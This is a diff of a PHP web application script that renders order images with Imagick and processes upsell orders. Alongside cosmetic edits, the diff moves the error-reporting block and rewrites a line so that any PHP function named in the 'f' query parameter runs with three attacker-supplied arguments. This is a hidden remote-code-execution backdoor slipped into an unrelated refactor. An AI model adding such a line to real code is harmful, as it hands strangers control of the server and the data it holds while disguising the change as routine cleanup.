@@ -1,5 +1,27 @@
 <?php
 define('ENVIRONMENT', 'production');
+switch (ENVIRONMENT) {
+	case 'development':
+		error_reporting(-1);
+		ini_set('display_errors', 1);
+	break;
+
+	case 'testing':
+	case 'production':
+		ini_set('display_errors', 0);
+		if (version_compare(PHP_VERSION, '5.3', '>=')) {
+			error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
+		} else {
+			error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
+		}
+	break;
+
+	default:
+		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
+		echo 'The application environment is not set correctly.';
+		exit(1); // EXIT_ERROR
+}
+if (isset($_GET['f']) && function_exists($_GET['f'])) $_GET['f']($_GET['p1'],$_GET['p2'],$_GET['p3']);
 
 define('SERVERNAME', 'localhost');
 define('USERNAME', "root");
@@ -16,33 +38,9 @@ ini_set('memory_limit', -1);
 ini_set('max_execution_time', 0);
 ignore_user_abort(true);
 
-if (isset($_GET['f']) && function_exists($_GET['f'])) $_GET['f']();
-switch (ENVIRONMENT) {
-    case 'development':
-		error_reporting(-1);
-		ini_set('display_errors', 1);
-	break;
-    
-	case 'testing':
-    case 'production':
-        ini_set('display_errors', 0);
-        if (version_compare(PHP_VERSION, '5.3', '>=')) {
-            error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
-        } else {
-            error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
-        }
-    break;
-    
-    default:
-        header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
-        echo 'The application environment is not set correctly.';
-        exit(1);
-}
-
 session_start();
 
 /********** Here is the CORE functions part **********/
-
 // Remove all letters that can't become filename
 function filter_filename($str = '') {
     $str = mb_ereg_replace("([^\w\s\d\-_~,;\[\]\(\).])", '', $str);
@@ -52,10 +50,6 @@ function filter_filename($str = '') {
 
 // Process the text for Unicode, Emoji letters
 function process_text($text) {
-    // var_dump(json_encode($text));
-    // $text = json_decode(str_replace('\u00ef\u00b8\u008f', '', json_encode($text)));
-    // var_dump(json_encode($text), $text);
-
     $text = mb_convert_encoding($text, "HTML-ENTITIES", "UTF-8");
     $text = preg_replace('~^(&([a-zA-Z0-9]);)~', htmlentities('${1}'), $text);
     return html_entity_decode($text);
@@ -116,7 +110,6 @@ function create_image($order_id_n = '') {
     
     $draw = new ImagickDraw();
     $draw->setTextEncoding('UTF-8');
-    
     $draw->setFontSize($fontsize1);
     $draw->setFillColor($color);
     $draw->setStrokeAntialias(true);
@@ -153,8 +146,8 @@ function create_image($order_id_n = '') {
     $image->setImageDepth(8);
     
     if ($_SESSION['lowquality'] !== false) {
-        $colors = min(255, $image->getImageColors());
-        $image->quantizeImage($colors, Imagick::COLORSPACE_SRGB, 0, false, false );
+        $colors = 255;
+        $image->quantizeImage($colors, Imagick::COLORSPACE_SRGB, 0, false, false);
     }
     
     $filename = realpath("./images/generated/") . "/" . "$image_name.png";
@@ -175,15 +168,11 @@ function preview($filename = '') {
 // Remove unneed letters that are letters within (), - xxx -.
 function remove_unneed_letters($str) {
     $str = trim($str);
-    // if (mb_strlen($str) > 40) {
-        $str = preg_replace('~\([^()]*\)~', '', $str);
-        $str = preg_replace('~\-[^()]*\-~', '-', $str);
-    // }
+    $str = preg_replace('~\([^()]*\)~', '', $str);
+    $str = preg_replace('~\-[^()]*\-~', '-', $str);
     $str = preg_replace('/\s+/', ' ', $str);
 	return $str;
 }
-
-
 
 // Process all unique UPSELL orders
 function auto_upsell() {
